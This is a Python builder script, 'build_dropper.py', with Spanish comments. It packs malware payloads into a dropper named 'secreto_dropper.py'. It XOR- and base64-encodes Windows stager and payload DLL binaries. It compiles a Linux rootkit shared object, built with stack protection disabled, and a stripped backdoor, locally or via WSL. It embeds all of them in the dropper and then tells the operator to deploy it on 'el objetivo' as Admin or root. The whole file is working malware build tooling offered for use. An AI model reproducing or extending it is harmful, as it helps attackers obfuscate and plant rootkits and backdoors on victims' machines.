#!/usr/bin/env python3
import argparse
import base64
import os
import platform
import re
import shutil
import subprocess
import sys
import tempfile
from typing import Dict, List, Optional


# Constantes

XOR_KEY    = 0x26
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
DROPPER    = os.path.join(SCRIPT_DIR, "secreto_dropper.py")
C_SOURCE   = os.path.join(SCRIPT_DIR, "Linux", "secreto_linux.c")
BD_SOURCE  = os.path.join(SCRIPT_DIR, "Linux", "secreto_backdoor.c")

# Variables del dropper para binarios Windows
WIN_PAYLOADS: Dict[str, str] = {
    "_STAGER_ENC"   : os.path.join(SCRIPT_DIR, "Stager", "bin", "Release", "Stager.exe"),
    "_PAYLOAD64_ENC": os.path.join(SCRIPT_DIR, "x64",    "Release", "PayloadDLL.dll"),
    "_PAYLOAD86_ENC": os.path.join(SCRIPT_DIR, "Release", "PayloadDLL.dll"),
}

# Variables del dropper para binarios Linux 
LINUX_ARCH_MAP: Dict[str, str] = {
    "x86_64":  "LINUX_SO_X86_64_B64",
    "aarch64": "LINUX_SO_ARM64_B64",
}
LINUX_BACKDOOR_VAR = "LINUX_BACKDOOR_B64"

# Candidatos de compilador por arquitectura
LINUX_COMPILERS: Dict[str, List[str]] = {
    "x86_64":  ["x86_64-linux-gnu-gcc", "gcc", "cc", "clang"],
    "aarch64": ["aarch64-linux-gnu-gcc", "aarch64-linux-gnu-cc", "clang"],
}

CFLAGS_SO = ["-fPIC", "-shared", "-O2",
             "-D_FORTIFY_SOURCE=0", "-fno-stack-protector", "-Wno-cast-function-type"]
LDFLAGS_SO = ["-ldl"]
CFLAGS_BD  = ["-O2", "-s"]
LDFLAGS_BD: List[str] = []

# Funciones de ayuda

def banner(title: str) -> None:
    w = max(56, len(title) + 6)
    print("=" * w)
    print(f"  {title}")
    print("=" * w)
    print()


def inject_b64(var: str, b64: str) -> None:
    with open(DROPPER, "r", encoding="utf-8") as f:
        content = f.read()
    content, n = re.subn(
        rf'^({re.escape(var)}\s*=\s*)"[^"]*"',
        rf'\1"{b64}"',
        content,
        flags=re.MULTILINE,
    )
    if n == 0:
        raise RuntimeError(
            f"Variable {var} no encontrada en {os.path.basename(DROPPER)}."
        )
    with open(DROPPER, "w", encoding="utf-8") as f:
        f.write(content)


def normalize_arch(arch: str) -> str:
    a = arch.lower()
    if a in ("amd64", "x86_64"):
        return "x86_64"
    if a in ("aarch64", "arm64"):
        return "aarch64"
    return arch


# Bloque 1: Payloads Windows

def _xor_b64(path: str) -> str:
    with open(path, "rb") as f:
        raw = f.read()
    return base64.b64encode(bytes(b ^ XOR_KEY for b in raw)).decode()


def pack_windows() -> bool:
    missing = [(v, p) for v, p in WIN_PAYLOADS.items() if not os.path.exists(p)]
    if missing:
        print("  [-] Binarios Windows no encontrados:")
        for _, p in missing:
            print(f"       {p}")
        print("  [!] Compila primero en Visual Studio (Release x86 + x64 + Stager).")
        return False

    for var, path in WIN_PAYLOADS.items():
        b64     = _xor_b64(path)
        size_kb = os.path.getsize(path) // 1024
        inject_b64(var, b64)
        print(f"  [+] {var:20s}  {size_kb:5d} KB")
    return True



# Bloque 2: Payload Linux

def _targets_linux(cc: str) -> bool:
    r = subprocess.run([cc, "-dumpmachine"], capture_output=True, text=True)
    return r.returncode == 0 and "linux" in r.stdout.lower()


def find_native_compiler(arch: str) -> Optional[str]:
    for cc in LINUX_COMPILERS.get(arch, []):
        if shutil.which(cc) and _targets_linux(cc):
            return cc
    return None


def _build_cmd(cc: str, arch: str, out: str, src: str) -> List[str]:
    cmd = [cc] + CFLAGS_SO + ["-o", out, src] + LDFLAGS_SO
    if arch == "aarch64" and os.path.basename(cc) == "clang":
        cmd = [cc, "--target=aarch64-linux-gnu"] + CFLAGS_SO + ["-o", out, src] + LDFLAGS_SO
    return cmd


def _build_backdoor_cmd(cc: str, out: str, src: str) -> List[str]:
    return [cc] + CFLAGS_BD + ["-o", out, src] + LDFLAGS_BD


def compile_native(arch: str) -> bytes:
    cc = find_native_compiler(arch)
    if not cc:
        tried = ", ".join(LINUX_COMPILERS.get(arch, []))
        raise RuntimeError(
            f"sin compilador Linux nativo para {arch}\n"
            f"    (probados: {tried})\n"
            f"    Nota: MinGW/Cygwin no sirven — solo generan PE, no ELF"
        )
    if not os.path.exists(C_SOURCE):
        raise RuntimeError(f"fuente no encontrado: {C_SOURCE}")

    with tempfile.TemporaryDirectory() as td:
        out = os.path.join(td, "secreto_rootkit.so")
        cmd = _build_cmd(cc, arch, out, C_SOURCE)
        print(f"    [{cc}]  {' '.join(cmd)}")
        r = subprocess.run(cmd, capture_output=True, text=True)
        if r.returncode != 0:
            raise RuntimeError(r.stderr.strip() or r.stdout.strip())
        with open(out, "rb") as f:
            return f.read()


def compile_backdoor_native(arch: str) -> bytes:
    cc = find_native_compiler(arch)
    if not cc:
        raise RuntimeError(f"sin compilador Linux nativo para {arch}")
    if not os.path.exists(BD_SOURCE):
        raise RuntimeError(f"fuente no encontrado: {BD_SOURCE}")
    with tempfile.TemporaryDirectory() as td:
        out = os.path.join(td, "secreto_backdoor")
        cmd = _build_backdoor_cmd(cc, out, BD_SOURCE)
        print(f"    [{cc}]  {' '.join(cmd)}")
        r = subprocess.run(cmd, capture_output=True, text=True)
        if r.returncode != 0:
            raise RuntimeError(r.stderr.strip() or r.stdout.strip())
        with open(out, "rb") as f:
            return f.read()


def _win_to_wsl(win_path: str) -> str:
    """Convierte  C:\\foo\\bar  ->  /mnt/c/foo/bar"""
    p = win_path.replace("\\", "/")
    if len(p) >= 2 and p[1] == ":":
        p = f"/mnt/{p[0].lower()}{p[2:]}"
    return p


def compile_backdoor_wsl(arch: str) -> bytes:
    """Compila backdoor via WSL."""
    if not shutil.which("wsl"):
        raise RuntimeError("WSL no disponible")
    cc_map = {"x86_64": "gcc", "aarch64": "aarch64-linux-gnu-gcc"}
    cc = cc_map.get(arch, "gcc")
    probe = subprocess.run(["wsl", "--", "which", cc], capture_output=True)
    if probe.returncode != 0:
        raise RuntimeError(f"WSL: '{cc}' no encontrado")
    if not os.path.exists(BD_SOURCE):
        raise RuntimeError(f"fuente no encontrado: {BD_SOURCE}")
    wsl_src  = _win_to_wsl(BD_SOURCE)
    out_wsl  = f"/tmp/_secreto_bd_{arch}"
    cmd = ["wsl", "--", cc] + CFLAGS_BD + ["-o", out_wsl, wsl_src] + LDFLAGS_BD
    print(f"    [wsl/{cc}]  {' '.join(cmd[3:])}")
    r = subprocess.run(cmd, capture_output=True, text=True)
    if r.returncode != 0:
        raise RuntimeError(f"error WSL:\n{r.stderr.strip() or r.stdout.strip()}")
    read_r = subprocess.run(["wsl", "--", "cat", out_wsl], capture_output=True)
    subprocess.run(["wsl", "--", "rm", "-f", out_wsl])
    if read_r.returncode != 0 or not read_r.stdout:
        raise RuntimeError("no se pudieron leer los bytes del backdoor desde WSL")
    return read_r.stdout


def compile_wsl(arch: str) -> bytes:
    if not shutil.which("wsl"):
        raise RuntimeError("WSL no disponible")

    cc_map = {"x86_64": "gcc", "aarch64": "aarch64-linux-gnu-gcc"}
    cc     = cc_map.get(arch, "gcc")

    probe = subprocess.run(["wsl", "--", "which", cc], capture_output=True)
    if probe.returncode != 0:
        pkg = "gcc" if arch == "x86_64" else "gcc-aarch64-linux-gnu"
        raise RuntimeError(
            f"WSL: '{cc}' no encontrado.\n"
            f"    Ejecuta UNA vez dentro de WSL y vuelve a lanzar el builder:\n"
            f"      wsl -- sudo apt update && wsl -- sudo apt install -y {pkg}"
        )

    if not os.path.exists(C_SOURCE):
        raise RuntimeError(f"fuente no encontrado: {C_SOURCE}")

    wsl_src = _win_to_wsl(C_SOURCE)
    out_wsl = f"/tmp/_secreto_{arch}.so"

    cmd = ["wsl", "--", cc] + CFLAGS_SO + ["-o", out_wsl, wsl_src] + LDFLAGS_SO
    print(f"    [wsl/{cc}]  {' '.join(cmd[3:])}")
    r = subprocess.run(cmd, capture_output=True, text=True)
    if r.returncode != 0:
        raise RuntimeError(f"error WSL:\n{r.stderr.strip() or r.stdout.strip()}")

    read_r = subprocess.run(["wsl", "--", "cat", out_wsl], capture_output=True)
    subprocess.run(["wsl", "--", "rm", "-f", out_wsl])
    if read_r.returncode != 0 or not read_r.stdout:
        raise RuntimeError("no se pudieron leer los bytes del .so desde WSL")
    return read_r.stdout


def _try_compile(native_fn, wsl_fn, arch: str, skip_wsl: bool) -> Optional[bytes]:
    """Intenta compilar con compilador local, luego con WSL si falla."""
    errors: List[str] = []
    try:
        return native_fn(arch), "local"
    except RuntimeError as e:
        errors.append(f"local: {e}")
    if not skip_wsl:
        try:
            return wsl_fn(arch), "WSL"
        except RuntimeError as e:
            errors.append(f"WSL: {e}")
    for err in errors:
        print(f"       {err}")
    return None, "fallo" 


def pack_linux(archs: List[str], skip_wsl: bool) -> bool:
    """
    Para cada arquitectura: compila .so y backdoor (local o WSL).
    Inyecta en el dropper lo que consiga.
    Devuelve True si al menos un .so se embegio correctamente.
    """
    any_ok = False
    bd_done = False

    for arch in archs:
        var = LINUX_ARCH_MAP.get(arch)
        if not var:
            print(f"  [!] Arquitectura desconocida: {arch}")
            continue

        so_bytes, via = _try_compile(compile_native, compile_wsl, arch, skip_wsl)
        if so_bytes is None:
            print(f"  [-] {arch} .so: no se pudo compilar")
            continue
        if so_bytes[:4] != b"\x7fELF":
            print(f"  [-] {arch} .so: ELF invalido")
            continue
        b64 = base64.b64encode(so_bytes).decode()
        try:
            inject_b64(var, b64)
        except RuntimeError as e:
            print(f"  [-] {arch} .so: inyeccion fallida: {e}")
            continue
        size_kb = len(so_bytes) // 1024
        print(f"  [+] {var:30s}  {size_kb:4d} KB  (via {via})")
        any_ok = True

        if not bd_done and arch == "x86_64":
            bd_bytes, bd_via = _try_compile(
                compile_backdoor_native, compile_backdoor_wsl, arch, skip_wsl
            )
            if bd_bytes and bd_bytes[:4] == b"\x7fELF":
                b64_bd = base64.b64encode(bd_bytes).decode()
                try:
                    inject_b64(LINUX_BACKDOOR_VAR, b64_bd)
                    print(f"  [+] {LINUX_BACKDOOR_VAR:30s}  {len(bd_bytes)//1024:4d} KB  (via {bd_via})")
                    bd_done = True
                except RuntimeError as e:
                    print(f"  [-] backdoor: inyeccion fallida: {e}")
            else:
                print(f"  [-] backdoor x86_64: no se pudo compilar")

    return any_ok


# Status

def show_status() -> None:
    with open(DROPPER, "r", encoding="utf-8") as f:
        content = f.read()

    dropper_kb = os.path.getsize(DROPPER) // 1024
    print(f"  {os.path.basename(DROPPER)}  ({dropper_kb} KB)\n")

    print("  Payloads Windows (XOR + base64):")
    for var in WIN_PAYLOADS:
        m = re.search(rf'^{re.escape(var)}\s*=\s*"([^"]*)"', content, re.MULTILINE)
        val = m.group(1) if m else ""
        if val:
            raw = bytes(b ^ XOR_KEY for b in base64.b64decode(val))
            tag = "PE" if raw[:2] == b"MZ" else "??"
            print(f"    {var:20s}  {len(raw)//1024:5d} KB  {tag}")
        else:
            print(f"    {var:20s}  (vacio)")

    print("\n  Payloads Linux (base64 ELF):")
    linux_vars = list(LINUX_ARCH_MAP.values()) + [LINUX_BACKDOOR_VAR]
    for var in linux_vars:
        m = re.search(rf'^{re.escape(var)}\s*=\s*"([^"]*)"', content, re.MULTILINE)
        val = m.group(1) if m else ""
        if val:
            raw = base64.b64decode(val)
            tag = "ELF" if raw[:4] == b"\x7fELF" else "??"
            print(f"    {var:30s}  {len(raw)//1024:5d} KB  {tag}")
        else:
            print(f"    {var:30s}  (vacio)")
    print()


# Main

def main() -> None:
    parser = argparse.ArgumentParser(
        prog="build_dropper.py",
        description="Builder universal — empaqueta todos los payloads en secreto_dropper.py",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=(
            "Ejemplos:\n"
            "  python  build_dropper.py            # Windows: VS bins + WSL .so\n"
            "  python3 build_dropper.py            # Linux: compila .so nativo\n"
            "  python3 build_dropper.py --arm64    # anade aarch64\n"
            "  python  build_dropper.py --skip-wsl # solo VS bins, sin WSL\n"
            "  python  build_dropper.py --status   # ver que esta embebido\n"
        ),
    )
    parser.add_argument("--arm64",    action="store_true",
                        help="Tambien compila .so para aarch64")
    parser.add_argument("--skip-wsl", action="store_true", dest="skip_wsl",
                        help="No intentar compilacion Linux via WSL")
    parser.add_argument("--status",   action="store_true",
                        help="Muestra que payloads estan embebidos en el dropper")
    args = parser.parse_args()

    host_arch = normalize_arch(platform.machine())
    banner(f"build_dropper.py  |  {platform.system()} / {host_arch}")

    if args.status:
        show_status()
        return

    # Arquitecturas Linux a compilar
    linux_archs: List[str] = [host_arch if host_arch in LINUX_ARCH_MAP else "x86_64"]
    if args.arm64 and "aarch64" not in linux_archs:
        linux_archs.append("aarch64")

    results: Dict[str, Optional[bool]] = {"windows": None, "linux": None}

    print("[1/2] Payloads Windows (Stager.exe + PayloadDLL x64/x86)...")
    results["windows"] = pack_windows()
    print()

    archs_str = " + ".join(linux_archs)
    print(f"[2/2] Payload Linux .so ({archs_str})...")
    results["linux"] = pack_linux(linux_archs, skip_wsl=args.skip_wsl)
    print()

    def tag(v: Optional[bool]) -> str:
        return "OK" if v else ("FALLO" if v is False else "-")

    dropper_kb = os.path.getsize(DROPPER) // 1024
    print("=" * 56)
    print(f"  Windows payloads  :  {tag(results['windows'])}")
    print(f"  Linux .so         :  {tag(results['linux'])}")
    print(f"  secreto_dropper   :  {dropper_kb} KB")
    print("=" * 56)
    print()

    any_ok = results["windows"] is True or results["linux"] is True
    if any_ok:
        print("[+] secreto_dropper.py listo.")
        print("    Deployalo en el objetivo con:")
        print("      Windows (Admin) ->  python  secreto_dropper.py")
        print("      Linux   (root)  ->  python3 secreto_dropper.py")
        print()
        print("[i] Verificar contenido: python build_dropper.py --status")
    else:
        print("[!] Ningun payload fue empaquetado. Revisa los errores anteriores.")
        sys.exit(1)


if __name__ == "__main__":
    main()
